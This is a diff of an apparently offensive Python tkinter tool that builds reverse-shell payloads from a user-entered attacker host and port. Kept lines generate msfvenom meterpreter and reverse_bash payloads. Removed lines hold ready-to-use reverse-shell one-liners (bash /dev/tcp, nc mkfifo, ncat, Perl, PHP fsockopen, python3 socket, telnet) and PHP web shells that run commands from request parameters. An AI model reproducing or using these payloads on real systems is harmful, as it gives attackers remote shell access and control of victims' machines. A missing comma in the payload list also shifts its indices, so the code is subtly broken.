@@ -34,14 +34,14 @@ lport_entry.place(x=560, y=140)
 
 generate_button = tk.Button(root, text="Generate Payload", font="arial 13 bold", fg="black", bg="light green",
                             command=lambda: generate_reverse_shell_payload())
-generate_button.place(x=390, y=300)
+generate_button.place(x=370, y=300)
 
 copy_button = tk.Button(root, text="Copy", font="arial 13 bold", fg="black", bg="yellow", command=lambda: copy_to_clipboard())
-copy_button.place(x=810, y=360)
+copy_button.place(x=430, y=430)
 
 # Result text
 result_text = tk.Text(root, height=2, width=80, bd=5, font="arial 12 bold")
-result_text.place(x=60, y=350)
+result_text.place(x=100, y=350)
 
 # Create and position the payload selection dropdown
 msf_payloads = [
@@ -63,80 +63,11 @@ msf_var.set(msf_payloads[0])  # Set default value
 msf_dropdown = tk.OptionMenu(root, msf_var, *msf_payloads)
 msf_dropdown.configure(font="arial 10 bold", fg="skyblue", bg="black")
 msf_dropdown.pack()
-msf_dropdown.place(x=130, y=200)
-
-# Linux Payloads
-linux_payloads = [
-
-    "Select Linux Payload: ",
-    "Bash-i",
-    "Bash196",
-    "Bash Read Line",
-    "Bash 5",
-    "Bash UDP",
-    "nc mkfifo",
-    "nc -e",
-    "BusyBox nc -e",
-    "nc -c",
-    "ncat -e",
-    "ncat UDP",
-    "rustcat",
-    "Perl no sh",
-    "PHP cmd",
-    "PHP cmd2",
-    "PHP cmd small"
-    "PHP exec",
-    "Python3",
-    "Telnet",
-]
-linux_var = tk.StringVar(root)
-linux_var.set(linux_payloads[0])  # Set default value
-linux_dropdown = tk.OptionMenu(root, linux_var, *linux_payloads)
-linux_dropdown.configure(font="arial 10 bold", fg="yellow", bg="black")
-linux_dropdown.pack()
-linux_dropdown.place(x=370, y=250)
-
-# Windows Payloads
-window_payloads = [
-
-    "Select Windows Payload: ",
-    "nc.exe -e",
-    "ncat.exe -e",
-    "Bash Read Line",
-    "Bash 5",
-    "Bash UDP",
-    "nc mkfifo",
-    "nc -e",
-    "BusyBox nc -e",
-    "nc -c",
-    "ncat -e",
-    "ncat UDP",
-    "rustcat",
-    "C",
-    "Perl",
-    "Perl no sh",
-    "Perl PentestMonkey",
-    "PHP Pentest Monkey",
-    "PHP cmd",
-    "PHP cmd2",
-    "PHP exec",
-    "Python3",
-    "Telnet",
-]
-windows_var = tk.StringVar(root)
-windows_var.set(window_payloads[0])  # Set default value
-window_dropdown = tk.OptionMenu(root, windows_var, *window_payloads)
-window_dropdown.configure(font="arial 10 bold", fg="white", bg="black")
-window_dropdown.pack()
-window_dropdown.place(x=565, y=200)
-
-
+msf_dropdown.place(x=330, y=230)
 def generate_reverse_shell_payload():
     lhost = lhost_entry.get()
     lport = lport_entry.get()
     msfpayload = msf_var.get()
-    linuxpayload = linux_var.get()
-    winpayload = windows_var.get()
 
     if msfpayload == msf_payloads[1]:
         payload_command = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)
@@ -168,81 +99,6 @@ def generate_reverse_shell_payload():
 
     elif msfpayload == msf_payloads[10]:
         payload_command = "msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw -o shell.sh".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[1]:
-        payload_command = "sh -i >& /dev/tcp/{}/{} 0>&1".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[2]:
-        payload_command = "0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[3]:
-        payload_command = "exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[4]:
-        payload_command = "sh -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[5]:
-        payload_command = "sh -i >& /dev/udp/{}/{} 0>&1".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[6]:
-        payload_command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[7]:
-        payload_command = "nc {} {} -e sh".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[8]:
-        payload_command = "busybox nc {} {} -e sh".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[9]:
-        payload_command = "nc -c sh {} {}".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[10]:
-        payload_command = "ncat {} {} -e sh".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[11]:
-        payload_command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {} {} >/tmp/f".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[12]:
-        payload_command = "rcat {} {} -r sh".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[13]:
-        payload_command = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{}:{}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'".format(
-            lhost, lport)
-
-    elif linuxpayload == linux_payloads[14]:
-        payload_command = '''<html>
-                             <body>
-                             <form method=\"GET\" name=\"<?php echo basename($_SERVER[\'PHP_SELF\']); ?>\">
-                             <input type=\"TEXT\" name="cmd" id=\"cmd\" size=\"80\">
-                             <input type=\"SUBMIT\" value=\"Execute\">
-                             </form>
-                             <pre>
-                             <?php
-                                if(isset($_GET[\'cmd\']))
-                                 {
-                                     system($_GET[\'cmd\']);
-                                 }
-                             ?>
-                             </pre>
-                             </body>
-                             <script>document.getElementById(\"cmd\").focus();</script>
-                             </html>'''
-
-    elif linuxpayload == linux_payloads[15]:
-        payload_command = "<?php if(isset($_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo \"</pre>\"; die; }?>"
-
-    elif linuxpayload == linux_payloads[16]:
-        payload_command = "<?=`$_GET[0]`?>"
-
-    elif linuxpayload == linux_payloads[17]:
-        payload_command = "php -r '$sock=fsockopen(\"{}\",{});exec(\"sh <&3 >&3 2>&3\");'".format(lhost, lport)
-
-    elif linuxpayload == linux_payloads[18]:
-        payload_command = "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\'".format(
-            lhost, lport)
-
-    elif linuxpayload == linux_payloads[19]:
-        payload_command = "TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF".format(lhost, lport)
 
     else:
         payload_command = "Make a valid selection"
